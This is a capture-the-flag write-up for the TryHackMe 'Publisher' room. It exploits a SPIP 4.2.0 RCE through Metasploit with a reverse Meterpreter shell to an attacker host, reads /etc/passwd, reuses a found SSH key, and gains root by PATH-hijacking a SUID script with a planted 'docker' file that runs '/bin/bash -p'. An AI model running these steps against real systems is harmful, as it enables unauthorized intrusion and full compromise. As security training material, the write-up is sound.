# TryHackMe CTF Write-Up: Publisher

Platform: [TryHackMe](https://tryhackme.com/)  
Room: [Publisher](https://tryhackme.com/room/publisher)  

## Initial Reconnaissance

I began with service enumeration using Nmap.

```bash
nmap -sC -sV -oN nmap.txt 10.112.142.149
```

<img width="1210" height="562" alt="image" src="https://github.com/user-attachments/assets/72122b72-57e1-45eb-91e0-094a533c4dc1" />

### Open Ports Discovered

| Port | Service | Version |
|------|----------|----------|
| 22   | SSH      | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP     | Apache httpd 2.4.41 |

With port 80 open, the web server became the primary attack surface.

## Web Enumeration

Navigating to:

```
http://10.112.142.149/
```

The website appeared to be running a CMS. 
I ran a gobuster directory scan:

```bash
gobuster dir -u http://10.112.142.149/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -o dir_scan.txt
```

It revealed:

- `/images/` → Directory listing enabled  
- `/spip/` → SPIP CMS running

<img width="1056" height="83" alt="image" src="https://github.com/user-attachments/assets/4aa4d18c-adae-4a4b-b721-b1d67f90b4d0" />

Using Wappalyzer on `/spip` directory, we get the version information:
- SPIP CMS 4.2.0
- Backend: PHP  

<img width="1920" height="803" alt="image" src="https://github.com/user-attachments/assets/19f8639e-d024-46ac-99f9-4fc7b745e159" />

The key discovery was SPIP version 4.2.0. Researching this version showed publicly available Remote Code Execution vulnerabilities. Since a Metasploit module existed for this issue, I decided to leverage it.

## Initial Access: Exploiting SPIP

Metasploit module used:

```
multi/http/spip_rce_form
```

Steps:

```bash
use multi/http/spip_rce_form
set RHOSTS 10.112.142.149
set TARGETURI /spip
set payload php/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
run
```

<img width="1549" height="366" alt="image" src="https://github.com/user-attachments/assets/f0a8c685-0bea-47ea-9c7f-8db058f0480a" />

The exploit succeeded and provided a Meterpreter shell as:

```
www-data
```

This established initial access to the system.

## Post-Exploitation Enumeration

Then I dropped to a system shell through `shell` command inside meterpreter.

Gathering system information:

```bash
uname -a
```

Output:

```
Linux 5.15.0-138-generic Ubuntu 20.04.6 LTS x86_64
```

```bash
cat /etc/issue
```

Output:

```
Ubuntu 20.04.6 LTS
```

This confirmed the target was running Ubuntu 20.04.

Inspecting `/etc/passwd`:

```bash
cat /etc/passwd
```

A regular user stood out:

```
think:x:1000:1000::/home/think:/bin/sh
```

During enumeration, I discovered an SSH private key belonging to the user `think`. Gaining SSH access would provide a more stable and interactive shell.

After saving the key locally:

```bash
chmod 600 id.rsa
ssh -i id.rsa think@<TARGET_IP>
```

I successfully logged in as `think`.

<img width="1061" height="727" alt="image" src="https://github.com/user-attachments/assets/344643a3-2512-4881-b71c-af00c281c7ed" />

## Privilege Escalation

The next goal was to obtain root access.

### Searching for SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Among the results, one binary stood out:

```
/usr/sbin/run_container
```

<img width="1501" height="517" alt="image" src="https://github.com/user-attachments/assets/651afb2d-7ca7-4f43-9b69-9608b9504fcc" />

This binary was not a standard system utility, making it a promising escalation vector.

### Investigating run_container

```bash
strings /usr/sbin/run_container
```

Output revealed:

```
...
/opt/run_container.sh
...
```

<img width="759" height="414" alt="image" src="https://github.com/user-attachments/assets/621d0bff-c377-4494-a553-a94560d284fb" />

This indicated that the SUID binary executes a shell script. If that script calls external programs insecurely, it may be exploitable.

### Attempting Direct Modification

Trying to modify `/opt/run_container.sh` resulted in permission denial although file permissions were just fine. This suggested additional security controls were preventing direct tampering.

### Discovering AppArmor

Checking the current shell:

```bash
echo $SHELL
```

Output:

```
/usr/sbin/ash
```

On Ubuntu systems, AppArmor is commonly used to enforce Mandatory Access Control. It restricts what programs can read, write, or execute based on defined security profiles.

Inspecting the AppArmor profile:

```bash
cat /etc/apparmor.d/usr.sbin.ash
```

<img width="845" height="607" alt="image" src="https://github.com/user-attachments/assets/1ab557d0-5951-4426-a880-ac113e5a3d8a" />

From the profile, I observed:

- Write access was restricted for most directories
- `/var/tmp` was writable

This meant that while sensitive files were protected, we still had a writable location to work with.

### Identifying the Vulnerability: PATH Injection

Inspecting `/opt/run_container.sh`, I noticed that it called:

```
docker
```

However, it did not use an absolute path such as:

```
/usr/bin/docker
```

<img width="1096" height="622" alt="image" src="https://github.com/user-attachments/assets/18cce9ba-39ba-4de6-9c2d-b8fe9e662789" />

When a command is called without an absolute path, the system searches for the executable in directories listed in the `$PATH` environment variable. If we can place a malicious executable earlier in `$PATH`, it will be executed instead.

This is known as PATH hijacking.

### Exploitation Steps

Move to writable directory:

```bash
cd /var/tmp
```

Create malicious `docker` file:

```bash
echo "/bin/bash -p" > docker
chmod +x docker
```

The `-p` flag preserves effective UID privileges in a SUID context.

I used this file first to switch to the bash shell to bypass any AppArmour restrictions and then to become root using the SUID bit.

Since the script called `docker` without an absolute path, it executed our malicious binary instead.

<img width="1100" height="225" alt="image" src="https://github.com/user-attachments/assets/922f1d4b-37d2-42c3-b081-0aba82c0ac3b" />

Confirming root access:

```bash
whoami
```

Output:

```
root
```

Navigating to `/root` revealed the root flag.

## Key Takeaways

### 1. Always Check for:

- Outdated CMS versions  
- Public exploits  
- SSH Keys with insecure permissions  

### 2. During Privilege Escalation:

- Enumerate SUID binaries carefully  
- Check for scripts called by SUID binaries  
- Look for PATH injection opportunities  
- Review AppArmor / SELinux policies  

### 3. Important Concepts Demonstrated:

- Remote Code Execution (RCE)  
- SSH Key Abuse  
- SUID Exploitation  
- PATH Injection  
- AppArmor Bypass  

## Final Thoughts

This room is an excellent example of:

- Real-world web exploitation  
- Practical privilege escalation  
- Understanding Linux security controls like AppArmor  

The privilege escalation path was particularly educational because it required understanding:

- How `$PATH` resolution works internally  
- How SUID binaries execute child processes  

- How security frameworks like AppArmor enforce confinement  
